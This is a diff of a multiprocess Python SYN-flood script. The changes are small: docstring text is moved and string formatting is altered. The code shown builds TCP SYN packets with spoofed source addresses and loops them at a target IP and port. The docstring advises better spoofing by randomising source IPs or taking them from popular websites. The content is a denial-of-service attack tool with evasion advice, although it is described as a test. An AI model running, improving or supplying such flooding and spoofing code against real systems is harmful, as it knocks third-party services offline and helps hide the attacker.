@@ -1,18 +1,19 @@
 """ ezSYN FLOOD MULTIPROCESS. 
 
-#Workers will have addresses looking like 15.15.X.Y 
-#X will be the number of the worker so worker number 1 will be firing from 15.15.1.Y 
-#Y will be iterating from 1 to 254 so every workers fires around 250 shots fro 250 different addresses all in the same range (to be easily detected as a test)
-#If you wish to use a better spoofing mechanism please make sure the source ip address (15.15.X.Y) is completely randomly generated or sourced from actual top 3000 websites (alexa) 
-
 Usage:
   ezSYN_FLOOD_MULTIPROCESS.py <dst_ip> <dst_port> [--workers=<amount>] [--sleep=<seconds>]
-  
+
 Options:
   -h, --help            Show options.
   --version             Version.
   --workers=<amount>    How many processes to fire [default: 4].
   --sleep=<seconds>     How many seconds to sleep between shots [default: 0].
+
+Workers will have addresses looking like 15.15.X.Y 
+X will be the number of the worker so worker number 1 will be firing from 15.15.1.Y 
+Y will be iterating from 1 to 254 so every workers fires around 250 shots fro 250 different addresses all in the same range (to be easily detected as a test)
+If you wish to use a better spoofing mechanism please make sure the source ip address (15.15.X.Y) is completely randomly generated or sourced from actual top 3000 websites (alexa)
+
 """
 
 from docopt import docopt
@@ -29,7 +30,7 @@ def flood(src_net: str, dst_ip: str, dst_port: int, sleep: int):
     for src_host in range(1, 254):
         for src_port in range(1024, 65535):
             # Build the packet
-            src_ip = f"{src_net}.{src_host}"
+            src_ip = "{src_net}.{src_host}".format(src_net=src_net, src_host=src_host)
             network_layer = IP(src=src_ip, dst=dst_ip)
             transport_layer = TCP(sport=src_port, dport=dst_port, flags="S")
 
